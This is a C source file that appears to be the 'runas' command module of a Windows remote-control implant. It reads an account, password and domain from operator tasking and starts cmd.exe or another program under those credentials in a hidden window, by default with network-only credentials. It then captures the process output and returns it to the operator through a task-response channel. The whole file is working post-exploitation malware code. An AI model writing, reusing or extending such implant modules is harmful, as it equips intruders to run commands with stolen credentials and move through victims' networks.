#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#ifdef INCLUDE_CMD_RUNAS

static int json_get_bool(const char *json, const char *key, int default_value) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *key_ptr = strstr(json, pattern);
    if (!key_ptr) return default_value;
    const char *val_ptr = strchr(key_ptr, ':');
    if (!val_ptr) return default_value;
    val_ptr++;
    while (*val_ptr == ' ' || *val_ptr == '\t') val_ptr++;
    if (strncmp(val_ptr, "true", 4) == 0) return 1;
    if (strncmp(val_ptr, "false", 5) == 0) return 0;
    return default_value;
}

static int json_get_int(const char *json, const char *key, int default_value) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *key_ptr = strstr(json, pattern);
    if (!key_ptr) return default_value;
    const char *val_ptr = strchr(key_ptr, ':');
    if (!val_ptr) return default_value;
    val_ptr++;
    while (*val_ptr == ' ' || *val_ptr == '\t') val_ptr++;
    if (*val_ptr >= '0' && *val_ptr <= '9') return atoi(val_ptr);
    return default_value;
}

void command_runas(char *task_id, char *params) {
    char username[256]    = {0};
    char password[512]    = {0};
    char domain[256]      = {0};
    char application[512] = "cmd.exe";
    char arguments[1024]  = {0};
    // Logon types: 2=Interactive, 3=Network, 8=NetworkCleartext, 9=NewCredentials
    int  logon_type       = 9;

    if (params[0] != '{') {
        send_task_response(task_id, "Error: runas expects JSON parameters");
        return;
    }

    extract_json_string(params, "account",     username,    sizeof(username));
    extract_json_string(params, "credential",  password,    sizeof(password));
    extract_json_string(params, "realm",       domain,      sizeof(domain));
    extract_json_string(params, "application", application, sizeof(application));
    extract_json_string(params, "arguments",   arguments,   sizeof(arguments));
    logon_type = json_get_int(params, "logon_type", 9);

    // Backward compatibility with old netOnly parameter
    if (json_get_bool(params, "netOnly", -1) == 1)  logon_type = 9;
    if (json_get_bool(params, "netOnly", -1) == 0)  logon_type = 2;

    if (username[0] == '\0') {
        send_task_response(task_id, "Error: account name is empty");
        return;
    }

    wchar_t wusername[256] = {0};
    wchar_t wpassword[512] = {0};
    wchar_t wdomain[256]   = {0};
    MultiByteToWideChar(CP_UTF8, 0, username, -1, wusername, 256);
    MultiByteToWideChar(CP_UTF8, 0, password, -1, wpassword, 512);
    MultiByteToWideChar(CP_UTF8, 0, domain[0] ? domain : ".", -1, wdomain, 256);

    HANDLE hReadOut  = NULL, hWriteOut  = NULL;
    HANDLE hReadErr  = NULL, hWriteErr  = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0) ||
        !CreatePipe(&hReadErr, &hWriteErr, &sa, 0)) {
        send_task_response(task_id, "Error: CreatePipe failed");
        return;
    }
    SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hReadErr, HANDLE_FLAG_INHERIT, 0);

    char full_cmd[2048] = {0};
    if (arguments[0] != '\0')
        snprintf(full_cmd, sizeof(full_cmd), "\"%s\" %s", application, arguments);
    else
        snprintf(full_cmd, sizeof(full_cmd), "\"%s\"", application);

    wchar_t wcmd[2048] = {0};
    MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wcmd, 2048);

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput  = hWriteOut;
    si.hStdError   = hWriteErr;
    si.hStdInput   = NULL;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    /* logon_type 9 (NewCredentials) -> LOGON_NETCREDENTIALS_ONLY, others -> LOGON_WITH_PROFILE */
    DWORD logon_flags = (logon_type == 9) ? LOGON_NETCREDENTIALS_ONLY : LOGON_WITH_PROFILE;

    BOOL ok = CreateProcessWithLogonW(
        wusername, wdomain, wpassword,
        logon_flags,
        NULL, wcmd,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi);
    DWORD err = GetLastError();

    CloseHandle(hWriteOut);
    CloseHandle(hWriteErr);

    if (!ok) {
        CloseHandle(hReadOut);
        CloseHandle(hReadErr);
        char msg[320];
        snprintf(msg, sizeof(msg),
                 "Error: CreateProcessWithLogonW failed for %s\\%s (err %lu)",
                 domain[0] ? domain : ".", username, err);
        send_task_response(task_id, msg);
        return;
    }

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Lire stdout
    char *output = (char *)malloc(1);
    output[0] = '\0';
    size_t total = 0;
    char buf[4096];
    DWORD bytes_read;

    while (ReadFile(hReadOut, buf, sizeof(buf) - 1, &bytes_read, NULL) && bytes_read > 0) {
        output = (char *)realloc(output, total + bytes_read + 1);
        memcpy(output + total, buf, bytes_read);
        total += bytes_read;
        output[total] = '\0';
    }
    CloseHandle(hReadOut);

    // Lire stderr et append
    while (ReadFile(hReadErr, buf, sizeof(buf) - 1, &bytes_read, NULL) && bytes_read > 0) {
        output = (char *)realloc(output, total + bytes_read + 1);
        memcpy(output + total, buf, bytes_read);
        total += bytes_read;
        output[total] = '\0';
    }
    CloseHandle(hReadErr);

    if (total == 0) {
        free(output);
        output = strdup("Process completed successfully, no output captured.");
    }

    send_task_response(task_id, output);
    free(output);
}

#endif
